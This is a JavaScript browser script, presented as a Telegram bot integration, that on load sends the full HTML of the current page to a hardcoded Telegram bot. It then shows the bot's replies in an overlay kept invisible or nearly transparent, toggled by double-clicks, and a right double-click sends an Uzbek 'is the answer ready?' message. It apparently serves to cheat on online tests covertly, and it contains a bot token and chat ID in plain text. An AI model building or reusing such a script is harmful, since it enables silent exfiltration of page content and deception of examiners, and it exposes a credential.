/**
 * Telegram Bot Integration Script (Final Logic)
 * 
 * Major Fixes applied:
 * 1. Global Right Double Click works ANYWHERE on screen (not just on floating window).
 * 2. Message text updated to 'javob tayyormi'.
 * 3. Drag lag permanently removed (no transitions).
 * 4. Show/Hide toggle is global double-click.
 */

(function () {
    // Configuration
    const BOT_TOKEN = '8349358858:AAE4JBM22GM6Xq04d6SpomCHooseLShpbbI';
    const CHAT_ID = '1456865327';
    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

    // State
    let lastUpdateId = 0;
    let isVisible = false; // "hide" by default
    let floatingWindow = null;

    // --- 1. Send HTML to Bot ---
    async function sendPageHtml() {
        try {
            const htmlContent = document.documentElement.outerHTML;
            const blob = new Blob([htmlContent], { type: 'text/html' });
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', blob, 'page_source.html');
            formData.append('caption', 'Page Source Code');

            await fetch(`${API_URL}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            console.log('HTML sent to Telegram');
        } catch (error) {
            console.error('Error sending HTML:', error);
        }
    }

    // --- 2. Floating Window UI ---
    function createFloatingWindow() {
        const div = document.createElement('div');
        div.id = 'tg-floating-window';

        // Styles
        Object.assign(div.style, {
            position: 'fixed',
            top: '20px',
            right: '20px',
            maxWidth: '25vw',
            minWidth: '150px',
            minHeight: '50px',
            zIndex: '999999',
            cursor: 'move',

            // Text Styling
            fontFamily: 'sans-serif',
            fontSize: '24px',
            fontWeight: '900',

            // Initial State: Hide
            opacity: '0',
            pointerEvents: 'none',

            // NO TRANSITION for movement! Only opacity if we wanted fade, but user wants instant.
            transition: 'none',

            // Container Styling
            background: 'transparent',
            border: 'none',
            padding: '10px',
            overflowWrap: 'break-word',
            userSelect: 'none'
        });

        div.textContent = 'Waiting for message...';
        document.body.appendChild(div);
        return div;
    }

    // --- 3. Interaction Logic ---
    function setupInteractions(el) {

        // --- GLOBAL TOGGLE (LEFT DOUBLE CLICK) ---
        document.addEventListener('dblclick', (e) => {
            // Prevent toggling if we are already interacting (e.g. dragging)? Not critical.
            toggleVisibility();
        });

        function toggleVisibility() {
            isVisible = !isVisible;

            if (isVisible) {
                // Show mode
                el.style.opacity = '0.05';
                el.style.pointerEvents = 'auto';
            } else {
                // Hide mode
                el.style.opacity = '0';
                el.style.pointerEvents = 'none';
            }
        }

        // --- DRAG LOGIC ---
        let isMouseDown = false;
        let isDragging = false;
        let currentX;
        let currentY;
        let initialX;
        let initialY;
        let xOffset = 0;
        let yOffset = 0;

        el.addEventListener('mousedown', dragStart);
        document.addEventListener('mouseup', dragEnd);
        document.addEventListener('mousemove', drag);

        function dragStart(e) {
            if (!isVisible) return;

            if (e.target === el && e.button === 0) {
                initialX = e.clientX - xOffset;
                initialY = e.clientY - yOffset;
                isMouseDown = true;
            }
        }

        function dragEnd(e) {
            initialX = currentX;
            initialY = currentY;
            isMouseDown = false;
            isDragging = false;
            el.style.cursor = 'move';
        }

        function drag(e) {
            if (!isMouseDown || !isVisible) return;

            e.preventDefault();
            isDragging = true;
            currentX = e.clientX - initialX;
            currentY = e.clientY - initialY;

            xOffset = currentX;
            yOffset = currentY;

            el.style.transform = `translate3d(${currentX}px, ${currentY}px, 0)`;
        }

        // --- GLOBAL RIGHT DOUBLE CLICK ---
        let rightClickCount = 0;
        let rightClickTimer = null;

        // CHANGED: Use 'document' instead of 'el' to capture right clicks anywhere
        document.addEventListener('contextmenu', (e) => {
            // Only trigger if visible (to avoid accidental triggers when just browsing normally)?
            // User requested strict behavior. 
            // If hidden -> script effectively "gone". So let's respect that.
            if (!isVisible) return;

            // If Visible -> Block default context menu and listen for double click
            e.preventDefault();
            rightClickCount++;

            if (rightClickCount === 1) {
                rightClickTimer = setTimeout(() => {
                    rightClickCount = 0;
                }, 500);
            } else if (rightClickCount === 2) {
                clearTimeout(rightClickTimer);
                rightClickCount = 0;
                sendTriggerMessage();
            }
        });
    }

    // --- 4. Bot Communication ---
    async function sendTriggerMessage() {
        try {
            await fetch(`${API_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: 'javob tayyormi' // UPDATED to lowercase per request
                })
            });
            console.log('Trigger message sent');
        } catch (error) {
            console.error('Error sending trigger:', error);
        }
    }

    async function pollUpdates() {
        try {
            const response = await fetch(`${API_URL}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
            const data = await response.json();

            if (data.ok && data.result.length > 0) {
                let latestMessage = null;

                for (const update of data.result) {
                    lastUpdateId = update.update_id;

                    if (update.message && String(update.message.chat.id) === CHAT_ID) {
                        if (update.message.text) {
                            latestMessage = update.message.text;
                        }
                    }
                }

                if (latestMessage) {
                    floatingWindow.textContent = latestMessage;
                }
            }
        } catch (error) {
            console.error('Polling error:', error);
        } finally {
            setTimeout(pollUpdates, 1000);
        }
    }

    // --- Initialization ---
    function init() {
        sendPageHtml();
        floatingWindow = createFloatingWindow();
        setupInteractions(floatingWindow);
        pollUpdates();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
